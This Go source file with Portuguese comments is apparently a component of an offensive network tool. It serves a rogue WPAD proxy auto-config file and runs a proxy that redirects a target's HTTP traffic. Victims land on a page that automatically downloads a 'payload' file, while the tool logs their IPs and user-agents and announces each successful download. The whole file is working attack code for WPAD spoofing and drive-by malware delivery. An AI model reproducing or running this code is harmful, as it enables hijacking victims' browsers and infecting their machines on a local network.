package fileserver

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync/atomic"
	"time"
)

// FileServer gerencia o servidor HTTP que:
// 1. Hospeda o wpad.dat (PAC file) para auto-configuração de proxy no alvo
// 2. Atua como proxy HTTP, redirecionando requisições para página de download
// 3. Serve o arquivo payload para download
type FileServer struct {
	filePath  string
	fileName  string
	localIP   string
	port      int
	proxyPort int
	isRunning atomic.Bool
	downloads int64
	server    *http.Server
	proxy     *http.Server
}

// NewFileServer cria um novo FileServer para servir o arquivo especificado.
func NewFileServer(filePath, localIP string) (*FileServer, error) {
	if _, err := os.Stat(filePath); err != nil {
		return nil, fmt.Errorf("arquivo não encontrado: %s", filePath)
	}

	return &FileServer{
		filePath:  filePath,
		fileName:  filepath.Base(filePath),
		localIP:   localIP,
		port:      80,
		proxyPort: 3128,
	}, nil
}

// Start inicia o servidor HTTP e o proxy em goroutines separadas.
func (fs *FileServer) Start() error {
	if fs.isRunning.Load() {
		return fmt.Errorf("servidor já está rodando")
	}

	go fs.startMainServer()
	go fs.startProxyServer()

	fs.isRunning.Store(true)
	return nil
}

// Stop encerra todos os servidores HTTP.
func (fs *FileServer) Stop() {
	if !fs.isRunning.Load() {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	if fs.server != nil {
		fs.server.Shutdown(ctx)
	}
	if fs.proxy != nil {
		fs.proxy.Shutdown(ctx)
	}

	fs.isRunning.Store(false)
}

// IsRunning verifica se o servidor está ativo.
func (fs *FileServer) IsRunning() bool {
	return fs.isRunning.Load()
}

// GetDownloadCount retorna o número de downloads realizados pelo alvo.
func (fs *FileServer) GetDownloadCount() int64 {
	return atomic.LoadInt64(&fs.downloads)
}

// GetFileURL retorna a URL direta de download do arquivo.
func (fs *FileServer) GetFileURL() string {
	return fmt.Sprintf("http://%s:%d/download", fs.localIP, fs.port)
}

// GetWPADURL retorna a URL do arquivo wpad.dat.
func (fs *FileServer) GetWPADURL() string {
	return fmt.Sprintf("http://%s:%d/wpad.dat", fs.localIP, fs.port)
}

// GetProxyAddr retorna o endereço do proxy HTTP.
func (fs *FileServer) GetProxyAddr() string {
	return fmt.Sprintf("%s:%d", fs.localIP, fs.proxyPort)
}

// startMainServer inicia o servidor HTTP principal na porta 80.
// Serve o wpad.dat, a landing page e o arquivo para download.
func (fs *FileServer) startMainServer() {
	mux := http.NewServeMux()

	// Serve o wpad.dat (PAC file) — configura o proxy automático no navegador do alvo
	mux.HandleFunc("/wpad.dat", fs.handleWPAD)

	// Serve o arquivo para download
	mux.HandleFunc("/download", fs.handleDownload)

	// Landing page com auto-download
	mux.HandleFunc("/", fs.handleLanding)

	fs.server = &http.Server{
		Addr:    fmt.Sprintf(":%d", fs.port),
		Handler: mux,
	}

	// Tenta porta 80, se falhar tenta 8080
	ln, err := net.Listen("tcp", fs.server.Addr)
	if err != nil {
		fmt.Printf("  [!] Porta 80 ocupada — tentando porta 8080 (WPAD auto-discovery pode não funcionar).\n")
		fs.port = 8080
		fs.server.Addr = fmt.Sprintf(":%d", fs.port)
		ln, err = net.Listen("tcp", fs.server.Addr)
		if err != nil {
			fmt.Printf("  [-] Erro ao iniciar servidor HTTP: %v\n", err)
			return
		}
	}

	fs.server.Serve(ln)
}

// startProxyServer inicia o proxy HTTP na porta 3128.
// Quando o alvo configura o WPAD, todo tráfego HTTP passa por aqui.
// Nós redirecionamos para a landing page de download.
func (fs *FileServer) startProxyServer() {
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// CONNECT = HTTPS — estabelece túnel transparente (não intercepta)
		if r.Method == "CONNECT" {
			fs.handleHTTPSTunnel(w, r)
			return
		}

		// Requisição proxy HTTP (URL absoluta) — redireciona para download
		if r.URL.IsAbs() {
			host := r.URL.Hostname()
			// Não redireciona requests para nosso próprio servidor
			if host == fs.localIP || host == "localhost" || host == "127.0.0.1" {
				fs.handleLanding(w, r)
				return
			}

			http.Redirect(w, r, fmt.Sprintf("http://%s:%d/", fs.localIP, fs.port), http.StatusFound)
			return
		}

		// Requisição direta — serve landing page
		fs.handleLanding(w, r)
	})

	fs.proxy = &http.Server{
		Addr:    fmt.Sprintf(":%d", fs.proxyPort),
		Handler: handler,
	}

	fs.proxy.ListenAndServe()
}

// handleWPAD serve o arquivo wpad.dat (Proxy Auto-Config).
// O PAC file instrui o navegador do alvo a usar nosso proxy para todo tráfego HTTP.
// Tráfego HTTPS é enviado direto (DIRECT) pois não podemos interceptá-lo sem certificado.
func (fs *FileServer) handleWPAD(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
	w.Header().Set("Cache-Control", "no-cache, no-store")

	pac := fmt.Sprintf(`function FindProxyForURL(url, host) {
    if (host == "%s") return "DIRECT";
    if (host == "localhost" || host == "127.0.0.1") return "DIRECT";
    if (shExpMatch(url, "https://*")) return "DIRECT";
    return "PROXY %s:%d; DIRECT";
}`, fs.localIP, fs.localIP, fs.proxyPort)

	w.Write([]byte(pac))
}

// handleDownload serve o arquivo payload para download com headers de download forçado.
func (fs *FileServer) handleDownload(w http.ResponseWriter, r *http.Request) {
	file, err := os.Open(fs.filePath)
	if err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}
	defer file.Close()

	stat, _ := file.Stat()

	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, fs.fileName))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", stat.Size()))

	io.Copy(w, file)
	atomic.AddInt64(&fs.downloads, 1)

	fmt.Printf("\n  [📥 DOWNLOAD COMPLETO] O alvo baixou '%s'! (%s)\n", fs.fileName, time.Now().Format("15:04:05"))
}

// handleLanding serve a página de download com auto-redirect via JavaScript.
// A página tem um design minimalista e redireciona automaticamente para /download após 1.5s.
func (fs *FileServer) handleLanding(w http.ResponseWriter, r *http.Request) {
	// ---------------- LOGGING DE CAPTIVE PORTAL ----------------
	// Registra que a requisição de checagem de conectividade do alvo bateu no nosso proxy
	go func(reqURL, remoteAddr, userAgent string) {
		logMsg := fmt.Sprintf("[%s] CAPTIVE HIT | IP: %s | URL: %s | User-Agent: %s\n", 
			time.Now().Format("2006-01-02 15:04:05"), 
			remoteAddr, 
			reqURL, 
			userAgent)
		
		f, err := os.OpenFile("wpad_captive_logs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			f.WriteString(logMsg)
			f.Close()
		}
	}(r.Host+r.URL.Path, r.RemoteAddr, r.UserAgent())
	// -----------------------------------------------------------

	downloadURL := fmt.Sprintf("http://%s:%d/download", fs.localIP, fs.port)

	html := fmt.Sprintf(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
               display: flex; justify-content: center; align-items: center;
               min-height: 100vh; margin: 0; background: #1a1a2e; color: #eee; }
        .container { text-align: center; padding: 2rem; }
        .spinner { border: 4px solid #333; border-top: 4px solid #0f3460;
                   border-radius: 50%%; width: 40px; height: 40px;
                   animation: spin 1s linear infinite; margin: 0 auto 1rem; }
        @keyframes spin { 0%% { transform: rotate(0deg); } 100%% { transform: rotate(360deg); } }
        a { color: #e94560; text-decoration: none; font-weight: bold; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Seu download iniciará automaticamente...</h2>
        <p>Se não iniciar, <a href="%s">clique aqui</a>.</p>
    </div>
    <script>
        setTimeout(function() { window.location.href = '%s'; }, 1500);
    </script>
</body>
</html>`, downloadURL, downloadURL)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(html))
}

// handleHTTPSTunnel cria um túnel transparente para conexões HTTPS (CONNECT).
// Não interceptamos HTTPS — apenas passamos a conexão adiante para o servidor real.
func (fs *FileServer) handleHTTPSTunnel(w http.ResponseWriter, r *http.Request) {
	destConn, err := net.DialTimeout("tcp", r.Host, 10*time.Second)
	if err != nil {
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
		return
	}
	defer destConn.Close()

	hijacker, ok := w.(http.Hijacker)
	if !ok {
		http.Error(w, "Hijacking not supported", http.StatusInternalServerError)
		return
	}

	clientConn, _, err := hijacker.Hijack()
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	defer clientConn.Close()

	// Envia 200 Connection Established para o cliente
	clientConn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))

	// Copia dados bidirecionalmente (túnel transparente)
	done := make(chan struct{}, 2)
	go func() {
		io.Copy(destConn, clientConn)
		done <- struct{}{}
	}()
	go func() {
		io.Copy(clientConn, destConn)
		done <- struct{}{}
	}()
	<-done
}
